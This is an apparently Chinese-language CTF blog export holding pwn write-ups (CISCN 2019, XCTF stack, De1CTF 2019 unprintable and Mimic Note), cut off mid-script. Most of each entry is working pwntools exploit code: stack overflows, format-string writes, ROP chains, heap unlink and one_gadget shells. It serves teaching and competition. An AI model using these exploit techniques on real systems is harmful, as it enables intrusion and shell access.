<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    BIN_PATH = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">    DEBUG = <span class="number">0</span></span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> DEBUG == <span class="number">1</span>:</span><br><span class="line">        p = process(BIN_PATH)</span><br><span class="line">        elf = ELF(BIN_PATH)</span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">        context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> context.arch == <span class="string">&#x27;amd64&#x27;</span>:</span><br><span class="line">            libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(<span class="string">&#x27;&#x27;</span>, )</span><br><span class="line">        elf = ELF(BIN_PATH)</span><br><span class="line">        libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">        <span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#gdb.attach(p, gdbscript=&#x27;b *0x401B42&#x27;)</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your program name:\n&#x27;</span>, <span class="string">&#x27;sunichi&#x27;</span>)</span><br><span class="line">    payload = <span class="string">&#x27;push push push save push add pop&#x27;</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your instruction:\n&#x27;</span>, payload)</span><br><span class="line">    <span class="keyword">print</span> hex(libc.symbols[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">    payload = str(<span class="number">0xf1147</span> - libc.symbols[<span class="string">&#x27;free&#x27;</span>]) + <span class="string">&#x27; &#x27;</span> + str(elf.got[<span class="string">&#x27;free&#x27;</span>]) + <span class="string">&#x27; &#x27;</span> + str((<span class="number">0xffffffffffffffff</span> - <span class="number">1663</span>) / <span class="number">8</span>) + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;1 &#x27;</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your stack data:\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2019</tag>
        <tag>ciscn</tag>
      </tags>
  </entry>
  <entry>
    <title>cyberearth xctf pwn stack writeup</title>
    <url>/2018/02/02/cyberearth-xctf-pwn-stack/</url>
    <content><![CDATA[<p>第一次和大佬们一起参加CTF比赛，在pwn中选了一个栈溢出的题目来做。</p>
<p>先丢到<code>ida</code>中，如其名“跑马灯”，程序会在跑完三轮跑马灯前的最后一次，设置一个定时器并在2秒后触发进入死循环<code>handler</code>。在跑马灯结束到触发<code>alarm</code>之前，有一个窗口可以提供输入。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">signal(<span class="number">14</span>, (<span class="keyword">__sighandler_t</span>)handler);</span><br><span class="line">alarm(<span class="number">2u</span>);</span><br><span class="line"><span class="comment">//......</span></span><br><span class="line"><span class="keyword">return</span> gee();</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>提供输入在<code>gee</code>函数内，<code>buf</code>长度为0x88，<code>read</code>读入上限为0x100，可以溢出，offset为140。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;*...........................................................&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);                 <span class="comment">// buf length 0x88 overflow</span></span><br></pre></td></tr></table></figure>

<p>通过简单的实验可知，先前的<code>signal</code>和<code>alarm</code>可以被后来的<code>signal</code>和<code>alarm</code>所覆盖，因此首先通过溢出令<code>alarm(2u)</code>失效。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># wait</span></span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">&#x27;*...........................................................&#x27;</span>)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">&#x27;*...........................................................&#x27;</span>)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">&#x27;*...........................................................&#x27;</span>)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">&#x27;*...........................................................&#x27;</span>)</span><br><span class="line"><span class="comment"># disable alarm</span></span><br><span class="line"><span class="comment"># 0x8048b5e call gee</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">140</span> + p32(alarm_plt) + p32(<span class="number">0x8048b5e</span>) + p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>

<p>编写<code>leak</code>函数并进行泄漏：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">140</span> + p32(write_plt) + p32(<span class="number">0x8048b5e</span>)  + p32(<span class="number">1</span>) + p32(addr) + p32(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">print</span> p.recvuntil(<span class="string">&#x27;...\n&#x27;</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    data = p.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="comment"># print data</span></span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">d = DynELF(leak, elf=ELF(<span class="string">&#x27;./stack&#x27;</span>), libcdb=<span class="literal">False</span>)</span><br><span class="line">execve_addr = d.lookup(<span class="string">&#x27;execve&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;execve:&#x27;</span> + hex(execve_addr)</span><br><span class="line">system_addr = d.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;system:&#x27;</span> + hex(system_addr)</span><br><span class="line">libcbase_addr = d.bases()[<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;libc base addr:&#x27;</span> + hex(libcbase_addr)</span><br></pre></td></tr></table></figure>

<p>在实际做题中，可以根据泄漏的函数地址找到对应的libc版本从而获取<code>/bin/sh</code>的偏移地址，由于没有环境，故直接导入本地libc。曾经尝试调用<code>system</code>并通过<code>read</code>读入<code>/bin/sh</code>字符串，但失败（包括先调用<code>start</code>恢复栈帧）。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">binsh_offset = next(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;/bin/sh offset:&#x27;</span> + hex(binsh_offset)</span><br><span class="line">binsh_addr = libcbase_addr + binsh_offset</span><br></pre></td></tr></table></figure>

<p>调用execve即可拿到shell：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">140</span> + p32(execve_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(binsh_addr) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2018</tag>
        <tag>xctf</tag>
        <tag>stack</tag>
      </tags>
  </entry>
  <entry>
    <title>De1CTF 2019 pwn writeup</title>
    <url>/2019/08/08/de1ctf19-pwn/</url>
    <content><![CDATA[<p>De1CTF的unprintable和Mimic Note。</p>
<a id="more"></a>

<h2 id="unprintable"><a href="#unprintable" class="headerlink" title="unprintable"></a>unprintable</h2><p>比赛的时候愣是没调出来，看了大佬们的做法，有一种做法和之前的某个题类似，就是劫持<code>exit()</code>执行时的控制流。在程序退出的时候，会调用<code>fini_array</code>上的函数，相关地址通过计算得到且计算过程中的一个参数在栈上有地址指向，因此可以通过格式化字符串修改该参数，使得执行<code>exit()</code>时跳回<code>main()</code>函数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">DEBUG = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./unprintable&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG == <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        p = process(<span class="string">&#x27;./unprintable&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">        p.recvuntil(<span class="string">&#x27;This is your gift: &#x27;</span>)</span><br><span class="line">        recv = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">        stack_addr = int(recv, <span class="number">16</span>)</span><br><span class="line">        target_addr = stack_addr - <span class="number">312</span> + <span class="number">0x18</span></span><br><span class="line">        <span class="keyword">print</span> hex(stack_addr)</span><br><span class="line">        <span class="keyword">print</span> hex(target_addr)</span><br><span class="line">        <span class="keyword">if</span> (target_addr &amp; <span class="number">0xffff</span> &gt; <span class="number">0x1000</span> <span class="keyword">or</span> (target_addr &amp; <span class="number">0xffff</span>) - (<span class="number">0x601060</span> - <span class="number">0x600dd8</span>) &lt; <span class="number">0x10</span>):</span><br><span class="line">            p.close()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG == <span class="number">1</span>:</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">offset_stack = (<span class="number">0x7fff14d283b0</span> - <span class="number">0x7fff14d28310</span>) / <span class="number">8</span> + <span class="number">6</span></span><br><span class="line">offset_ret   = (<span class="number">0x7fff9de105e8</span> - <span class="number">0x7fff9de105c0</span>) / <span class="number">8</span> + <span class="number">6</span></span><br><span class="line">offset_buf = <span class="number">0x601060</span> - <span class="number">0x600dd8</span></span><br><span class="line">target_ret = target_addr &amp; <span class="number">0xffff</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + str(offset_buf + <span class="number">0x17</span>) + <span class="string">&#x27;x%&#x27;</span> + str(offset_stack) + <span class="string">&#x27;$hn&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;%&#x27;</span> + str(target_ret - offset_buf - <span class="number">0x17</span>) + <span class="string">&#x27;x%&#x27;</span> + str(offset_ret) + <span class="string">&#x27;$hn&#x27;</span></span><br><span class="line">payload += p64(<span class="number">0x4007a3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(payload) - <span class="number">8</span> != <span class="number">0x17</span>:</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + str(offset_buf + <span class="number">0x16</span>) + <span class="string">&#x27;x%&#x27;</span> + str(offset_stack) + <span class="string">&#x27;$hn&#x27;</span></span><br><span class="line">    payload += <span class="string">&#x27;%&#x27;</span> + str(target_ret - offset_buf - <span class="number">0x16</span>) + <span class="string">&#x27;x%&#x27;</span> + str(offset_ret) + <span class="string">&#x27;$hn&#x27;</span></span><br><span class="line">    payload += p64(<span class="number">0x4007a3</span>)    </span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">offset_ret = (<span class="number">0x7ffc94990a40</span> - <span class="number">0x7ffc949909b8</span>) / <span class="number">8</span> + <span class="number">6</span></span><br><span class="line">offset_rsp = (<span class="number">0x7fff5a400bc0</span> - <span class="number">0x7fff5a400b78</span>) / <span class="number">8</span> + <span class="number">6</span></span><br><span class="line">target_addr += <span class="number">0x8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> target_addr &amp; <span class="number">0xffff</span> &lt; <span class="number">0x7a3</span>:</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + str(target_addr &amp; <span class="number">0xffff</span>) + <span class="string">&#x27;x%&#x27;</span> + str(offset_rsp) + <span class="string">&#x27;$hn&#x27;</span></span><br><span class="line">    payload += <span class="string">&#x27;%&#x27;</span> + str(<span class="number">0x7a3</span> - (target_addr &amp; <span class="number">0xffff</span>)) + <span class="string">&#x27;x%&#x27;</span> + str(offset_ret) + <span class="string">&#x27;$hn&#x27;</span> + <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + str(<span class="number">0x7a3</span>) + <span class="string">&#x27;x%&#x27;</span> + str(offset_ret) + <span class="string">&#x27;$hn&#x27;</span></span><br><span class="line">    payload += <span class="string">&#x27;%&#x27;</span> + str((target_addr &amp; <span class="number">0xffff</span>) - <span class="number">0x7a3</span>) + <span class="string">&#x27;x%&#x27;</span> + str(offset_rsp) + <span class="string">&#x27;$hn&#x27;</span> + <span class="string">&#x27;\x00&#x27;</span>    </span><br><span class="line"></span><br><span class="line">raw_input()</span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># change pop rsp value 0x1060 / ret</span></span><br><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + str(<span class="number">0x7a3</span>) + <span class="string">&#x27;x%&#x27;</span> + str(offset_ret) + <span class="string">&#x27;$hn&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;%&#x27;</span> + str(<span class="number">0x1200</span> - <span class="number">0x7a3</span>) + <span class="string">&#x27;x%41$hn&#x27;</span> + <span class="string">&#x27;\x00&#x27;</span> </span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((target_addr &amp; <span class="number">0xffff</span>) + <span class="number">2</span>) &lt; <span class="number">0x7a3</span>:</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + str((target_addr &amp; <span class="number">0xffff</span>) + <span class="number">2</span>) + <span class="string">&#x27;x%15$hn&#x27;</span></span><br><span class="line">    payload += <span class="string">&#x27;%&#x27;</span> + str(<span class="number">0x7a3</span> - ((target_addr &amp; <span class="number">0xffff</span>) + <span class="number">2</span>)) + <span class="string">&#x27;x%23$hn&#x27;</span> + <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + str(<span class="number">0x7a3</span>) + <span class="string">&#x27;x%23$hn&#x27;</span></span><br><span class="line">    payload += <span class="string">&#x27;%&#x27;</span> + str(((target_addr &amp; <span class="number">0xffff</span>) + <span class="number">2</span>) - <span class="number">0x7a3</span>) + <span class="string">&#x27;x%15$hn&#x27;</span> + <span class="string">&#x27;\x00&#x27;</span>    </span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + str(<span class="number">0x60</span>) + <span class="string">&#x27;x%41$n&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;%&#x27;</span> + str(<span class="number">0x7a3</span> - <span class="number">0x60</span>) + <span class="string">&#x27;x%23$hn&#x27;</span> + <span class="string">&#x27;\x00&#x27;</span> </span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + str(<span class="number">0x82d</span>) + <span class="string">&#x27;x%23$hn&#x27;</span> + <span class="string">&#x27;\x00&#x27;</span> </span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x400833</span></span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x601218</span><span class="number">-0x601060</span><span class="number">-8</span>, <span class="string">&#x27;\x00&#x27;</span>) + <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload += p64(<span class="number">0x40082a</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(elf.got[<span class="string">&#x27;read&#x27;</span>]) + p64(<span class="number">0x800</span>) + p64(<span class="number">0x601800</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x400810</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">payload += p64(<span class="number">0x400833</span>) + p64(<span class="number">0x601060</span>) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(<span class="number">0x40082d</span>) + p64(<span class="number">0x601800</span> - <span class="number">8</span> * <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0x40082a</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(elf.got[<span class="string">&#x27;read&#x27;</span>]) + p64(<span class="number">0x1</span>) + p64(<span class="number">0x601218</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x400810</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">payload += p64(<span class="number">0x40082a</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(elf.got[<span class="string">&#x27;read&#x27;</span>]) + p64(<span class="number">59</span>) + p64(<span class="number">0x601060</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x400810</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0x40082a</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(<span class="number">0x601218</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x601210</span>) + p64(<span class="number">0x400810</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">&#x27;\xac&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">&#x27;\x00&#x27;</span> * <span class="number">59</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh 1&gt;&amp;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x000000000040082c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040082e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400830 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400832 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040082b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040082f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400690 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000400833 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000400831 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040082d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004005d1 : ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="Mimic-Note"><a href="#Mimic-Note" class="headerlink" title="Mimic Note"></a>Mimic Note</h2><p>要用同一个脚本同时打通两个程序并且要让其输出一致（输入不确定是否要一致，但调exp的时候调成一致了）。由于32bit和64bit程序<code>size_t</code>大小不一致，使得两边的unlink不会互相影响，所以只要编排好chunk的顺序就能在两边按次序完成<em>unlink</em>。</p>
<p><em>unlink</em>完成后利用劫持<code>atoi()@got</code>进行ROP，这里一个较难的点就是要让两个程序同时进入ROP以免程序输出不一致。然后就是疯狂找gadget，同时利用数据的错位，使得两个程序在一次输入后同时进入了ROP。</p>
<p>再往后就是常规的没有输出的情况下进行ROP getshell了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">p, size</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>, str(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size?\n&#x27;</span>, str(size))</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">p, idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>, str(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index ?\n&#x27;</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">p, idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>, str(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index ?\n&#x27;</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">p, idx, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>, str(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index ?\n&#x27;</span>, str(idx))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content?\n&#x27;</span>, content)</span><br><span class="line">    <span class="comment">#sleep(0.5)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>(<span class="params">count</span>):</span></span><br><span class="line">    DEBUG = <span class="number">0</span></span><br><span class="line">    arch = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    elf32 = ELF(<span class="string">&#x27;./mimic_note_32&#x27;</span>)</span><br><span class="line">    elf64 = ELF(<span class="string">&#x27;./mimic_note_64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#if DEBUG == 1 and arch == &#x27;64&#x27;:</span></span><br><span class="line">    <span class="comment">#    p = process(&#x27;./mimic_note_64&#x27;)</span></span><br><span class="line">    <span class="comment">#elif DEBUG == 1 and arch == &#x27;32&#x27;:</span></span><br><span class="line">    <span class="comment">#    p = process(&#x27;./mimic_note_32&#x27;)</span></span><br><span class="line">    <span class="keyword">if</span> DEBUG == <span class="number">1</span>:</span><br><span class="line">        <span class="comment">#p = process(&#x27;./mimic&#x27;)</span></span><br><span class="line">        <span class="comment">#p = remote(&#x27;127.0.0.1&#x27;, 9999)</span></span><br><span class="line">        p = process(<span class="string">&#x27;./mimic&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(<span class="string">&#x27;45.32.120.212&#x27;</span>, <span class="number">6666</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> DEBUG == <span class="number">1</span>:</span><br><span class="line">        <span class="comment">#pass</span></span><br><span class="line">        gdb.attach(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 64 bit unlink</span></span><br><span class="line">    add(p, <span class="number">0x100</span><span class="number">-8</span>) <span class="comment"># 0</span></span><br><span class="line">    add(p, <span class="number">0x100</span><span class="number">-8</span>) <span class="comment"># 1</span></span><br><span class="line">    add(p, <span class="number">0x100</span><span class="number">-8</span>) <span class="comment"># 2</span></span><br><span class="line">    add(p, <span class="number">0x100</span><span class="number">-8</span>) <span class="comment"># 3</span></span><br><span class="line">    delete(p, <span class="number">0</span>)</span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0xf0</span>) + p64(<span class="number">0x200</span>)</span><br><span class="line">    edit(p, <span class="number">1</span>, payload)</span><br><span class="line"></span><br><span class="line">    delete(p, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    add(p, <span class="number">0x1f8</span>) <span class="comment"># 0 is 1</span></span><br><span class="line">    add(p, <span class="number">0xf8</span>)  <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(<span class="number">0xf1</span>) + p64(<span class="number">0x6020b0</span><span class="number">-0x18</span>) + p64(<span class="number">0x6020b0</span><span class="number">-0x10</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0xf0</span>, <span class="string">&#x27;\x00&#x27;</span>) + p64(<span class="number">0xf0</span>)</span><br><span class="line">    edit(p, <span class="number">1</span>, payload)</span><br><span class="line">    delete(p, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 32 bit unlink</span></span><br><span class="line">    add(p, <span class="number">0x100</span><span class="number">-8</span>)</span><br><span class="line">    add(p, <span class="number">0x100</span><span class="number">-8</span>)</span><br><span class="line"></span><br><span class="line">    add(p, <span class="number">0x100</span><span class="number">-4</span>) <span class="comment"># 32 bit 5/6/7</span></span><br><span class="line">    add(p, <span class="number">0x100</span><span class="number">-4</span>)</span><br><span class="line">    add(p, <span class="number">0x100</span><span class="number">-4</span>)</span><br><span class="line">    add(p, <span class="number">0x100</span><span class="number">-4</span>)</span><br><span class="line"></span><br><span class="line">    delete(p, <span class="number">5</span>)</span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0xf8</span> + p32(<span class="number">0x200</span>)</span><br><span class="line">    edit(p, <span class="number">6</span>, payload)</span><br><span class="line">    delete(p, <span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">    add(p, <span class="number">0x1f8</span>+<span class="number">4</span>) <span class="comment"># 5 is 6</span></span><br><span class="line">    add(p, <span class="number">0xf8</span>+<span class="number">4</span>)  <span class="comment"># 7</span></span><br><span class="line">    payload = p32(<span class="number">0</span>) + p32(<span class="number">0xf9</span>) + p32(<span class="number">0x804a090</span><span class="number">-0x18</span>/<span class="number">2</span>) + p32(<span class="number">0x804a090</span><span class="number">-0x10</span>/<span class="number">2</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0xf8</span>, <span class="string">&#x27;\x00&#x27;</span>) + p32(<span class="number">0xf8</span>)</span><br><span class="line">    